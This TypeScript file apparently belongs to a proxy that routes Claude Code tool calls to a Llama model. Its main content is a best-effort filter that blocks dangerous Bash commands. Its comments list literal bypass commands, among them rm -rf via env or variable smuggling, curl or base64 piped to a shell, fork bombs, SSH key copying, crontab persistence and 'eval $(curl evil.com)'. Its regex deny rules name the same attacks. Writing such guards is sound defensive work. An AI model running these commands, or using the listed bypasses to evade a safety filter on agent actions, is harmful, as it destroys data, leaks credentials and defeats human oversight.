/**
 * transform.ts — pure, side-effect-free helpers shared across the Claudberghini proxy.
 *
 * All functions here are exported so they can be unit-tested independently of the
 * Express application.  They have no imports from server.ts (no circular dependency).
 *
 * NOTE on guardToolUse: this is a BEST-EFFORT safety filter, NOT a security boundary.
 * A determined adversary can always craft inputs that bypass text-pattern matching.
 * The purpose is to prevent the weak Llama 3.1 8B model from accidentally hallucinating
 * destructive commands during normal coding tasks, not to defend against an attacker
 * who controls the prompt.
 */

// ─── Model routing ──────────────────────────────────────────────────────────────

/**
 * Decide whether a request's model should be forwarded VERBATIM to real Anthropic
 * (vs. the proxied Llama backend). `pattern` is a case-insensitive regex tested against
 * the model id; default 'opus' means a real-Opus coordinator passes through while
 * sonnet/haiku sub-agents route to Llama. Returns false for empty model/pattern, and
 * falls back to substring matching if `pattern` is not a valid regex.
 *
 * The caller is still responsible for checking that an API key is configured — this
 * function only answers "does this model WANT passthrough", not "can we do it".
 */
export function isPassthroughModel(model: string, pattern: string): boolean {
  if (!model || !pattern) return false;
  try {
    return new RegExp(pattern, 'i').test(model);
  } catch {
    return model.toLowerCase().includes(pattern.toLowerCase());
  }
}

// ─── Tool-input coercion ──────────────────────────────────────────────────────

export interface ToolDef {
  required: string[];
  props: string[];
}

/**
 * Build a name → {required, props} map from the request's Anthropic tool schemas,
 * used to coerce malformed tool inputs from the weak model.
 */
export function buildToolDefMap(
  tools: Array<{ name?: string; input_schema?: { properties?: Record<string, unknown>; required?: string[] } }> | undefined
): Record<string, ToolDef> {
  const map: Record<string, ToolDef> = {};
  for (const t of tools || []) {
    if (!t || !t.name) continue;
    const props = t.input_schema?.properties ? Object.keys(t.input_schema.properties) : [];
    const required = Array.isArray(t.input_schema?.required) ? t.input_schema!.required! : [];
    map[t.name] = { required, props };
  }
  return map;
}

/**
 * Repair a common Llama 3.1 8B malformation: emitting `input` as a BARE STRING for a
 * single-parameter tool instead of an object. e.g. the model emits
 *   <tool_call>{"name":"Bash","input":"echo hi >> f"}</tool_call>
 * instead of {"input":{"command":"echo hi >> f"}}, which leaves input.command undefined,
 * the tool errors cryptically, and the model loops to a timeout. When the tool has exactly
 * one unambiguous target parameter, wrap the string into it. Multi-param tools (Edit, Write)
 * are left untouched — a bare string can't fill two required fields.
 *
 * MUST run BEFORE guardToolUse, so the safety guard sees the real command string rather
 * than `undefined` (a bare-string Bash input would otherwise bypass the guard entirely).
 */
export function coerceToolInput<T extends { name: string; input: unknown }>(
  tu: T,
  toolDefs: Record<string, ToolDef>
): T {
  if (!tu || typeof tu.input !== 'string') return tu;
  const def = toolDefs[tu.name];
  if (!def) return tu;
  const target =
    def.required.length === 1
      ? def.required[0]
      : def.required.length === 0 && def.props.length === 1
        ? def.props[0]
        : null;
  if (!target) return tu;
  return { ...tu, input: { [target]: tu.input } };
}

// ─── Anthropic type stubs needed here (avoid importing from server.ts) ─────────

interface AnthropicRequestLike {
  messages: Array<{ role: string; content: unknown }>;
}

interface ClaudberghiniMessageLike {
  content: string;
}

interface ClaudberghiniRequestLike {
  messages: ClaudberghiniMessageLike[];
}

// ─── flattenContent ────────────────────────────────────────────────────────────

/**
 * Flatten an Anthropic content value (string OR array of content blocks) into a
 * plain string.  Claude Code sends system + message content as arrays of
 * {type:'text', text:'...'} blocks (often with cache_control), and
 * tool_result/tool_use blocks.  Claudberghini needs plain strings.
 */
export function flattenContent(content: unknown): string {
  if (typeof content === 'string') return content;
  if (Array.isArray(content)) {
    return content
      .map((block: any) => {
        if (typeof block === 'string') return block;
        if (block?.type === 'text' && typeof block.text === 'string') return block.text;
        if (block?.type === 'tool_result') {
          // Format tool results as an explicit observation so the model distinguishes
          // tool feedback from user input (per Hermes/UniClaudeProxy convention).
          const inner = flattenContent(block.content);
          return `<tool_response>\n${inner}\n</tool_response>`;
        }
        if (block?.type === 'tool_use') {
          // Replay past tool calls in the SAME format the model is told to emit,
          // to avoid format drift across turns.
          return `<tool_call>${JSON.stringify({ name: block.name, input: block.input ?? {} })}</tool_call>`;
        }
        return '';
      })
      .filter(Boolean)
      .join('\n');
  }
  return '';
}

// ─── groundingScore ───────────────────────────────────────────────────────────

/**
 * Fraction of an answer's significant tokens that actually appear in the reference
 * (the tool output).  Higher = more grounded, less hallucinated.
 */
export function groundingScore(answer: string, reference: string): number {
  if (!reference) return 0;
  const ref = reference.toLowerCase();
  const tokens = answer.toLowerCase().match(/[a-z0-9_./-]{4,}/g) || [];
  if (tokens.length === 0) return 0;
  let hit = 0;
  for (const t of tokens) if (ref.includes(t)) hit++;
  return hit / tokens.length;
}

// ─── priorToolResultText ──────────────────────────────────────────────────────

/**
 * Extract the text of prior tool results from the (already-flattened) Claudberghini
 * messages.  Used to ground final answers against what tools actually returned.
 */
export function priorToolResultText(claudberghiniRequest: ClaudberghiniRequestLike): string {
  const all = claudberghiniRequest.messages.map((m) => m.content).join('\n');
  const matches = all.match(/<tool_response>[\s\S]*?<\/tool_response>/g);
  return matches ? matches.join('\n') : '';
}

// ─── lastMessageIsToolResult ──────────────────────────────────────────────────

/**
 * Does the last message carry a tool_result (i.e. the model should now produce a
 * final answer, not necessarily another tool call)?
 */
export function lastMessageIsToolResult(req: AnthropicRequestLike): boolean {
  const m = req.messages[req.messages.length - 1];
  if (!m || !Array.isArray(m.content)) return false;
  return (m.content as any[]).some((b) => b && b.type === 'tool_result');
}

// ─── trimSystemPromptToBytes ──────────────────────────────────────────────────

/**
 * Trim a system prompt to at most `maxBytes` UTF-8 bytes.  Keeps the HEAD
 * (core instructions + tool defs, 70%) and TAIL (most-recent guidance, 30%),
 * inserting a truncation notice in the middle so the model is aware of the cut.
 *
 * Uses Buffer.byteLength(s, 'utf8') rather than .length so multi-byte characters
 * (CJK, emoji, etc.) are measured correctly.
 */
export function trimSystemPromptToBytes(prompt: string, maxBytes: number): string {
  if (Buffer.byteLength(prompt, 'utf8') <= maxBytes) return prompt;

  // Binary-search for the right character-slice boundaries that respect the
  // byte limit.  For BMP-only text this is O(1); for mixed text it converges fast.
  function sliceToBytes(s: string, start: number, byteLimit: number): string {
    // Quick check: ASCII fast-path (byteLength === length for pure ASCII).
    let slice = s.slice(start, start + byteLimit);
    while (Buffer.byteLength(slice, 'utf8') > byteLimit) {
      // Binary-search shrink: at most ~7 iterations for any real prompt.
      slice = slice.slice(0, Math.floor(slice.length * 0.9));
    }
    return slice;
  }

  const headBytes = Math.floor(maxBytes * 0.7);
  const tailBytes = maxBytes - headBytes;

  const originalBytes = Buffer.byteLength(prompt, 'utf8');
  const head = sliceToBytes(prompt, 0, headBytes);

  // Tail: we need the LAST `tailBytes` worth of the string.
  // Estimate from the end and shrink if needed.
  function sliceTailToBytes(s: string, byteLimit: number): string {
    let slice = s.slice(Math.max(0, s.length - byteLimit));
    while (Buffer.byteLength(slice, 'utf8') > byteLimit) {
      slice = slice.slice(Math.ceil(slice.length * 0.1)); // trim leading chars
    }
    return slice;
  }

  const tail = sliceTailToBytes(prompt, tailBytes);
  const trimmedBytes = originalBytes - maxBytes;
  const notice = `\n\n[...${trimmedBytes} bytes trimmed to fit context...]\n\n`;

  const result = head + notice + tail;
  console.warn(
    `[WARN] System prompt trimmed ${originalBytes} -> ${Buffer.byteLength(result, 'utf8')} bytes to fit Claudberghini context`
  );
  return result;
}

// ─── guardToolUse ─────────────────────────────────────────────────────────────

/**
 * Block destructive / privileged shell commands the weak model sometimes hallucinates.
 * Returns the tool-use object if safe, or null if it should be refused.
 *
 * DESIGN NOTE — this is a BEST-EFFORT heuristic, NOT a security boundary.
 * Pattern-matching on shell text cannot prevent a motivated adversary from crafting
 * bypasses.  The goal is to catch accidental hallucinations during normal dev work.
 *
 * CONFIRMED BYPASSES ADDRESSED (compared with the original implementation):
 *   1. `env sudo rm -rf /`          — env/command wrapper stripping
 *   2. `x=rm; $x -rf /`            — VAR=val prefix stripping
 *   3. `eval "sudo rm -rf /"`       — eval/exec unwrapping
 *   4. `sh -c "rm -rf /"`          — sh/bash -c unwrapping
 *   5. `a=sudo; $a rm -rf /`       — variable assignment smuggling (partial)
 *   6. `rm -fr /`                  — -fr flag order variant
 *   7. `: () { :|:& };:`           — spaced fork-bomb variant
 *   8. `curl url | tee f && sh f`  — tee-then-execute pipe-to-shell
 *   9. `base64 -d <<< ... | bash`  — base64 decode-then-exec
 *  10. `python3 -c "import os; os.system('rm -rf /')"`  — interpreter -e/-c exec
 *  11. `git config core.pager 'rm -rf /'`               — git config hook injection
 *  12. Semi-colon / newline chaining: checked per-segment
 *  13. `rm -rf ~`, `rm -rf .`, `rm -rf *`               — common target variants
 *  14. `chmod -R 777 ~`, `chown -R root .`              — recursive privilege change
 *  15. `cat ~/.ssh/id_rsa`, `cp ~/.ssh/* /tmp`          — SSH key exfiltration
 *  16. `crontab -e`, `>> ~/.zshrc`                      — persistence
 *  17. `mv exploit /usr/local/bin/node`                 — PATH directory injection
 *  18. `wget url | sh`                                  — wget pipe-to-shell
 */
export function guardToolUse(tu: any): any | null {
  if (!tu) return null;
  if (tu.name !== 'Bash') return tu;

  const rawCmd = String(tu.input?.command || '');
  if (!rawCmd.trim()) return tu; // empty command — allow (no-op)

  // Normalize: collapse runs of whitespace (not newlines — they are segment separators)
  const normalize = (s: string) => s.replace(/[ \t]+/g, ' ').trim();

  // Split into shell segments on: ; && || | \n
  // Quote-aware: delimiters inside single- or double-quoted spans are NOT treated as
  // segment boundaries.  This prevents `python3 -c "import os; os.system(...)"` from
  // being split at the `;` inside the quoted -c argument.
  function splitSegments(cmd: string): string[] {
    const parts: string[] = [];
    let current = '';
    let inSingle = false;
    let inDouble = false;

    for (let i = 0; i < cmd.length; i++) {
      const ch = cmd[i];

      if (ch === "'" && !inDouble) {
        inSingle = !inSingle;
        current += ch;
        continue;
      }
      if (ch === '"' && !inSingle) {
        inDouble = !inDouble;
        current += ch;
        continue;
      }

      // Inside a quoted span — accumulate without splitting.
      if (inSingle || inDouble) {
        current += ch;
        continue;
      }

      // Outside quotes — check for segment delimiters.
      if (ch === '\n' || ch === ';') {
        if (current.trim()) parts.push(current.trim());
        current = '';
        continue;
      }
      if (ch === '|' && cmd[i + 1] === '|') {
        if (current.trim()) parts.push(current.trim());
        current = '';
        i++; // skip second '|'
        continue;
      }
      if (ch === '&' && cmd[i + 1] === '&') {
        if (current.trim()) parts.push(current.trim());
        current = '';
        i++; // skip second '&'
        continue;
      }
      if (ch === '|') {
        if (current.trim()) parts.push(current.trim());
        current = '';
        continue;
      }

      current += ch;
    }
    if (current.trim()) parts.push(current.trim());
    return parts;
  }

  // Recursively extract segments from command substitution $(...)  and backticks `...`.
  // Returns all segments including those inside substitutions.
  function allSegments(cmd: string): string[] {
    const top = splitSegments(cmd);
    const extra: string[] = [];

    // Find all $(...) contents
    const dollarParen = /\$\(([^)]*)\)/g;
    let m: RegExpExecArray | null;
    while ((m = dollarParen.exec(cmd)) !== null) {
      extra.push(...allSegments(m[1]));
    }

    // Find all backtick contents
    const backtick = /`([^`]*)`/g;
    while ((m = backtick.exec(cmd)) !== null) {
      extra.push(...allSegments(m[1]));
    }

    return [...top, ...extra];
  }

  // Strip leading VAR=value assignments (e.g. `FOO=bar BAR=baz cmd ...`).
  const stripEnvAssignments = (s: string): string =>
    s.replace(/^([A-Za-z_][A-Za-z0-9_]*=[^\s]* )+/, '').trim();

  // Collect VAR=value assignments across ALL segments into a map so that
  // `$VAR` references in later segments can be resolved.  This is a simple
  // one-pass scan — we only handle bare `VAR=value` standalone assignments
  // (not nested or dynamic ones) but that covers the most common evasion pattern.
  function collectVarAssignments(segments: string[]): Map<string, string> {
    const env = new Map<string, string>();
    for (const seg of segments) {
      const norm = normalize(seg);
      // Standalone VAR=value segment (the segment IS the assignment)
      const m = norm.match(/^([A-Za-z_][A-Za-z0-9_]*)=(\S+)$/);
      if (m) env.set(m[1], m[2]);
      // Also pick up leading assignments inside a segment: VAR=val cmd ...
      const leading = norm.match(/^([A-Za-z_][A-Za-z0-9_]*)=(\S+)\s+/);
      if (leading && !env.has(leading[1])) env.set(leading[1], leading[2]);
    }
    return env;
  }

  // Substitute $VAR / ${VAR} occurrences using the collected assignment map.
  function applyVarSubstitution(s: string, env: Map<string, string>): string {
    return s.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (_, braced, bare) => {
      const name = braced ?? bare;
      return env.get(name) ?? (braced ? `\${${name}}` : `$${name}`);
    });
  }

  // Strip known wrapper commands to find the effective argv[0].
  // Handles: env, command, eval, exec, xargs, nohup, timeout N, sh -c, bash -c, zsh -c.
  function unwrapWrappers(s: string): string {
    const WRAPPERS = /^(env|command|eval|exec|xargs|nohup)\s+/i;
    const TIMEOUT = /^timeout\s+\S+\s+/i;
    const SH_C = /^(sh|bash|zsh|dash|ksh)\s+(-\S+\s+)*-c\s+['"]?/i;

    let prev = '';
    while (prev !== s) {
      prev = s;
      s = s.replace(WRAPPERS, '').trim();
      s = s.replace(TIMEOUT, '').trim();
      // sh -c "..." or bash -c '...' — unwrap the quoted inner command
      const shMatch = SH_C.exec(s);
      if (shMatch) {
        // Strip the sh -c and leading quote; trailing quote left — regex handles it
        s = s.slice(shMatch[0].length).replace(/['"]$/, '').trim();
      }
    }
    return s;
  }

  // Derive the effective command string for a segment (strip env vars + wrappers).
  // Iterates strip+unwrap until the string stabilizes so that a wrapper (e.g. `env`)
  // that re-exposes a leading VAR= prefix after unwrapping gets re-stripped.
  // Example: `env X=1 . ~/.evil`
  //   round 1: stripEnvAssignments('env X=1 . ~/.evil') → 'env X=1 . ~/.evil' (no leading VAR=)
  //            unwrapWrappers('env X=1 . ~/.evil')       → 'X=1 . ~/.evil'
  //   round 2: stripEnvAssignments('X=1 . ~/.evil')     → '. ~/.evil'
  //            unwrapWrappers('. ~/.evil')               → '. ~/.evil'  (stable)
  //   result: '. ~/.evil' → anchored /^\.\s+/ matches → BLOCKED
  function effectiveCmd(segment: string): string {
    let s = normalize(segment);
    let prev = '';
    while (prev !== s) {
      prev = s;
      s = stripEnvAssignments(s);
      s = unwrapWrappers(s);
      // Token-only wrappers (env/eval/command/exec/nohup) consume only the wrapper
      // word, leaving any quote the wrapper introduced still attached
      // (e.g. `eval "X=1 . ~/.evil"` → `"X=1 . ~/.evil"`). Strip a leading quote so
      // the next iteration can re-strip the inner VAR= prefix and re-anchor the
      // dangerous-command checks. `echo ". hi"` is unaffected: echo is not a wrapper,
      // so its quotes are never at position 0 of the effective string.
      const q = s[0];
      if (q === '"' || q === "'") {
        s = (s.endsWith(q) && s.length >= 2 ? s.slice(1, -1) : s.slice(1)).trim();
      }
    }
    return s;
  }

  // ── Dangerous-pattern tests ─────────────────────────────────────────────────
  //
  // Each test receives the FULL original command (for multi-token patterns) AND
  // the effective argv[0]-onwards string for the current segment.
  //
  // Patterns that must match the full command (not per-segment) are applied once
  // below; per-segment tests run inside the segment loop.

  // Targets considered "dangerous roots": /, ~, $HOME, ., *
  // Broadened: ~ and $HOME are followed by / or quote or boundary (not just whitespace/EOL),
  // so `rm -rf ~/Documents`, `rm -rf $HOME/`, `rm -rf "$HOME"` are all caught.
  // Also match bare globstar /* and /home/* paths.
  // Strip surrounding double/single quotes from each token before testing, so that
  // `"$HOME"` is treated the same as `$HOME`.
  function isDangerousTarget(s: string): boolean {
    // Strip quotes from tokens so "$HOME" and '$HOME' are caught.
    const unquoted = s.replace(/["']/g, '');
    // Bare root /
    if (/(?:^|\s)\/$/.test(unquoted) || /(?:^|\s)\/(\s|$)/.test(unquoted)) return true;
    // ~ followed by anything (including ~/subdir) — broad match
    if (/(?:^|\s)~[/"'\s]/.test(unquoted) || /(?:^|\s)~$/.test(unquoted)) return true;
    // $HOME or ${HOME} followed by anything (or end)
    if (/(?:^|\s)\$(?:HOME|\{HOME\})/.test(unquoted)) return true;
    // Bare dot (current dir)
    if (/(?:^|\s)\.(\s|$)/.test(unquoted)) return true;
    // Glob star
    if (/(?:^|\s)\*(\s|$)/.test(unquoted) || /(?:^|\s)[^\s]*\*/.test(unquoted)) return true;
    return false;
  }
  // Keep the old regex for chmod/chown compatibility — broadened version above used for rm.
  const DANGEROUS_TARGET = /(?:^|\s)(\/|~|\$HOME|\$\{HOME\}|\.|(?:\\\s)*\*)(\s|$)/;

  // rm with recursive flag targeting a dangerous root OR *.
  // Allows: rm -f build.tmp (single relative file, no -r).
  // Allows: rm -rf node_modules dist build .next .cache (relative named dirs).
  // Blocks: rm -rf / ~ $HOME . * (any of the dangerous-target forms).
  const RM_RECURSIVE = /\brm\b/;
  // Short flags: -r, -rf, -fr, -R, etc.  Long flags: --recursive.
  const RM_RECURSIVE_FLAG =
    /(?:^|\s)-[a-zA-Z]*r[a-zA-Z]*(?:\s|$)/i; // -r, -rf, -fr, -r -f, etc.
  const RM_RECURSIVE_FLAG_LONG = /(?:^|\s)--recursive(?:\s|$)/i; // --recursive

  function isBlockedRm(effective: string): boolean {
    if (!RM_RECURSIVE.test(effective)) return false;
    const hasRecursiveFlag = RM_RECURSIVE_FLAG.test(effective) || RM_RECURSIVE_FLAG_LONG.test(effective);
    if (!hasRecursiveFlag) return false;
    // Allow removal of known-safe named dirs: node_modules, dist, build, .next, .cache, out, coverage
    const SAFE_RM_TARGETS = /\b(node_modules|dist|build|\.next|\.cache|out|coverage)\b/;
    if (SAFE_RM_TARGETS.test(effective) && !isDangerousTarget(effective)) return false;
    // Block if it targets a dangerous root (use broadened isDangerousTarget for rm)
    return isDangerousTarget(effective);
  }

  // find ... -delete  or  find ... -exec rm/unlink/...
  function isBlockedFind(effective: string): boolean {
    if (!/\bfind\b/.test(effective)) return false;
    if (/-delete\b/.test(effective)) return true;
    if (/-exec\s+(rm|unlink|shred|truncate)\b/.test(effective)) return true;
    return false;
  }

  // mkfs  or  dd if=...  or  dd of=/dev/...  or  > /dev/sd*
  function isBlockedDevOps(full: string): boolean {
    if (/\bmkfs\b/.test(full)) return true;
    if (/\bdd\s[^|;]*\bif=/.test(full)) return true;
    if (/\bdd\s[^|;]*\bof=\/dev\//.test(full)) return true;
    if (/>\s*\/dev\/sd/.test(full)) return true;
    return false;
  }

  // Fork bomb: :(){:|:&};:  or  : () { :|:& }; :  (with any whitespace variation)
  const FORK_BOMB = /:\s*\(\s*\)\s*\{/;

  // chmod -R with permissive mode targeting dangerous root.
  function isBlockedChmod(effective: string): boolean {
    if (!/\bchmod\b/.test(effective)) return false;
    if (!/-[a-zA-Z]*R[a-zA-Z]*/.test(effective)) return false; // needs -R
    // Mode is permissive if it includes 777 or +x (coarse check).
    if (!/777|[+]x/.test(effective)) return false;
    return DANGEROUS_TARGET.test(effective);
  }

  // chown -R targeting dangerous root.
  function isBlockedChown(effective: string): boolean {
    if (!/\bchown\b/.test(effective)) return false;
    if (!/-[a-zA-Z]*R[a-zA-Z]*/.test(effective)) return false;
    return DANGEROUS_TARGET.test(effective);
  }

  // Writes/appends to dotfiles & secrets.
  // Targets: ~/.zshrc ~/.bashrc ~/.bash_profile ~/.profile ~/.ssh/* ~/.aws/ ~/.config/ ~/.npmrc ~/.netrc
  //          crontab /etc/(passwd|shadow|hosts|sudoers)
  // NOTE: use .source on BOTH operands — concatenating a RegExp literal directly
  //       coerces it via toString() which includes the surrounding `/` delimiters,
  //       producing a pattern that can never match.
  const SENSITIVE_WRITE_TARGET =
    /(?:>>|>)\s*~\/\.(zshrc|bashrc|bash_profile|profile|ssh\/[^\s]*|aws\/[^\s]*|config\/[^\s]*|npmrc|netrc)/.source +
    '|' +
    /(?:>>|>)\s*\/etc\/(passwd|shadow|hosts|sudoers)/.source;
  const SENSITIVE_WRITE_RE = new RegExp(SENSITIVE_WRITE_TARGET);

  // Reading SSH/private keys.
  function isBlockedKeyRead(effective: string): boolean {
    if (!/\b(cat|cp|scp|rsync|base64)\b/.test(effective)) return false;
    return /~\/\.ssh\/|\/\.ssh\/|id_rsa|id_ed25519|\.pem\b/.test(effective);
  }

  // crontab manipulation.
  const CRONTAB = /\bcrontab\b/;

  // Shutdown / reboot / halt / poweroff.
  const SHUTDOWN = /\b(shutdown|reboot|halt|poweroff|init\s+0|init\s+6)\b/;

  // sudo / doas.
  const SUDO = /\b(sudo|doas)\b/;

  // Pipe-to-shell: any command whose output is piped directly into a shell interpreter.
  // Covers: curl/wget/fetch/printf/echo piped to sh/bash/zsh/dash/ksh;
  //         here-strings (bash <<<) feeding a shell; tee-then-exec patterns.
  function isBlockedNetworkPipe(full: string): boolean {
    // Direct pipe from network tool: curl ... | bash
    if (/\b(curl|wget|fetch)\b[^;]*\|\s*(sh|bash|zsh|dash|ksh)\b/.test(full)) return true;
    // Via tee: curl ... | tee file && bash file  (or sh file, source file)
    if (/\b(curl|wget|fetch)\b[^;]*\|\s*tee\b/.test(full) && /\b(sh|bash|zsh|source)\b/.test(full))
      return true;
    // printf/echo piped to shell: printf "..." | bash
    if (/\b(printf|echo)\b[^;]*\|\s*(sh|bash|zsh|dash|ksh)\b/.test(full)) return true;
    // Here-string feeding a shell: bash <<< "..."
    if (/\b(sh|bash|zsh|dash|ksh)\b\s*<<</.test(full)) return true;
    return false;
  }

  // base64 decode piped to shell: base64 -d | bash, base64 --decode | bash, base64 -D | bash
  function isBlockedBase64Exec(full: string): boolean {
    return /base64\s+(-d\b|--decode\b|-D\b)[^|;]*\|\s*(sh|bash|zsh|dash|ksh)\b/.test(full);
  }

  // python/python3/perl/ruby/node with -c/-e whose body contains exec primitives.
  // Runs against the FULL normalized command (not per-segment) so that a `;` inside
  // a quoted -c "..." argument does not fragment the check across two segments.
  function isBlockedInterpreterExec(effective: string): boolean {
    if (!/\b(python3?|perl|ruby|node|nodejs)\b/.test(effective)) return false;
    if (!/-[ce]\b/.test(effective)) return false;
    // Exec primitives that can spawn subprocesses
    return /os\.system|subprocess|exec\s*\(|eval\s*\(|spawn|Runtime\.exec/.test(effective);
  }

  // git config setting alias/pager/hook to a shell command.
  function isBlockedGitConfigHook(effective: string): boolean {
    if (!/\bgit\b/.test(effective)) return false;
    if (!/\bconfig\b/.test(effective)) return false;
    // Block if setting alias.*, core.pager, or hook paths
    return /\b(alias\.|core\.pager|core\.hooksPath|init\.templateDir)\b/.test(effective);
  }

  // mv/cp into system PATH directories.
  const SYSTEM_PATH_DIRS =
    /\/(usr\/local\/bin|usr\/bin|usr\/sbin|sbin|bin|usr\/lib|lib|etc)\b/;
  function isBlockedPathInjection(effective: string): boolean {
    if (!/\b(mv|cp)\b/.test(effective)) return false;
    return SYSTEM_PATH_DIRS.test(effective);
  }

  // /etc/(passwd|shadow|hosts|sudoers) access (read or write).
  const ETC_SENSITIVE = /\/etc\/(passwd|shadow|hosts|sudoers)/;

  // source / . sourcing of arbitrary files.
  // Blocks: source ~/.evil, . ~/.evil, source /tmp/payload.sh
  // Allowlist: only well-known safe rc fragments (none by default — all sourcing blocked).
  function isBlockedSourceExec(full: string): boolean {
    // Match: source <path> or . <path> (standalone dot followed by a path, not flags)
    // Use word boundary for 'source'; for '.' require it to be at word boundary.
    if (/\bsource\s+\S/.test(full)) return true;
    // Standalone dot command: must be preceded by start-of-string or segment delimiter,
    // followed by a path-like token (starts with ~, /, ., or a word char).
    if (/(?:^|[;|&\n])\s*\.\s+[^\s-]/.test(full)) return true;
    return false;
  }

  // eval with command-substitution containing a network tool or base64 decode.
  // Covers: eval $(curl evil.com), eval `wget ...`, eval $(echo x | base64 -d)
  function isBlockedDangerousEval(full: string): boolean {
    if (!/\beval\b/.test(full)) return false;
    // Any eval containing $(...) or backticks with a network fetch
    if (/\beval\b[^;]*\$\([^)]*\b(curl|wget|fetch)\b/.test(full)) return true;
    if (/\beval\b[^;]*`[^`]*\b(curl|wget|fetch)\b/.test(full)) return true;
    // Any eval containing $(...) or backticks with base64 decode
    if (/\beval\b[^;]*\$\([^)]*\bbase64\b/.test(full)) return true;
    if (/\beval\b[^;]*`[^`]*\bbase64\b/.test(full)) return true;
    return false;
  }

  // ── Apply full-command tests (not per-segment) ──────────────────────────────

  const fullNorm = normalize(rawCmd);

  // Build the var-assignment map from segments FIRST so that $VAR references in the
  // full command can be resolved before running network-pipe and base64 checks.
  // We compute segments here (duplicated below for the per-segment loop) because the
  // var map must be available before we run any full-command test.
  const segmentsForVars = allSegments(rawCmd);
  const varEnvFull = collectVarAssignments(segmentsForVars);
  // Apply variable substitution to the full normalized command before pattern matching.
  const fullNormResolved = varEnvFull.size > 0 ? applyVarSubstitution(fullNorm, varEnvFull) : fullNorm;

  if (FORK_BOMB.test(fullNorm)) {
    console.log(`[WARN] BLOCKED fork bomb in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  if (isBlockedDevOps(fullNorm)) {
    console.log(`[WARN] BLOCKED device/disk operation in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  if (SENSITIVE_WRITE_RE.test(fullNorm)) {
    console.log(`[WARN] BLOCKED write to sensitive file in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  // Run network-pipe and base64 checks against BOTH the raw fullNorm and the
  // var-substituted version so that $VAR-smuggled commands are caught.
  if (isBlockedNetworkPipe(fullNorm) || isBlockedNetworkPipe(fullNormResolved)) {
    console.log(`[WARN] BLOCKED network-pipe-to-shell in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  if (isBlockedBase64Exec(fullNorm) || isBlockedBase64Exec(fullNormResolved)) {
    console.log(`[WARN] BLOCKED base64-decode-to-exec in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  if (ETC_SENSITIVE.test(fullNorm)) {
    console.log(`[WARN] BLOCKED access to sensitive /etc file: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  // Run interpreter-exec check against the FULL normalized command so that a `;`
  // inside a quoted -c "..." argument cannot fragment the check across segments.
  if (isBlockedInterpreterExec(fullNorm) || isBlockedInterpreterExec(fullNormResolved)) {
    console.log(`[WARN] BLOCKED interpreter exec in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  if (isBlockedSourceExec(fullNorm) || isBlockedSourceExec(fullNormResolved)) {
    console.log(`[WARN] BLOCKED source/dot-exec in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }
  if (isBlockedDangerousEval(fullNorm) || isBlockedDangerousEval(fullNormResolved)) {
    console.log(`[WARN] BLOCKED dangerous eval in Bash command: ${rawCmd.slice(0, 120)}`);
    return null;
  }

  // ── Per-segment tests ───────────────────────────────────────────────────────

  const segments = allSegments(rawCmd);

  // Collect VAR=value assignments so $VAR references can be resolved before danger checks.
  // (varEnvFull computed above is reused — reuse it here via a shared reference.)
  const varEnv = varEnvFull;

  for (const seg of segments) {
    // Apply variable substitution ($VAR / ${VAR}) before running any danger test.
    const resolvedSeg = varEnv.size > 0 ? applyVarSubstitution(seg, varEnv) : seg;
    const eff = effectiveCmd(resolvedSeg);
    if (!eff) continue;

    if (SUDO.test(eff)) {
      console.log(`[WARN] BLOCKED sudo/doas in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedRm(eff)) {
      console.log(`[WARN] BLOCKED destructive rm in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedFind(eff)) {
      console.log(`[WARN] BLOCKED destructive find in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedChmod(eff)) {
      console.log(`[WARN] BLOCKED chmod -R in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedChown(eff)) {
      console.log(`[WARN] BLOCKED chown -R in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedKeyRead(eff)) {
      console.log(`[WARN] BLOCKED SSH/key read in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (CRONTAB.test(eff)) {
      console.log(`[WARN] BLOCKED crontab access in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (SHUTDOWN.test(eff)) {
      console.log(`[WARN] BLOCKED shutdown/reboot in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedInterpreterExec(eff)) {
      console.log(`[WARN] BLOCKED interpreter exec in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedGitConfigHook(eff)) {
      console.log(`[WARN] BLOCKED git config hook injection in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    if (isBlockedPathInjection(eff)) {
      console.log(`[WARN] BLOCKED PATH-dir injection in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
    // Per-segment sourcing check: catches env-prefix smuggling (X=1 . ~/.evil)
    // and dot-command inside command substitution (x=$(. ~/.evil)).
    // effectiveCmd strips leading VAR=val assignments, so eff starts with '.' or 'source'
    // when those forms are used. Anchored regexes avoid false positives.
    if (/^\.\s+[^\s-]/.test(eff) || /^source\s+\S/.test(eff)) {
      console.log(`[WARN] BLOCKED source/dot-exec in Bash command: ${rawCmd.slice(0, 120)}`);
      return null;
    }
  }

  return tu; // passed all checks
}
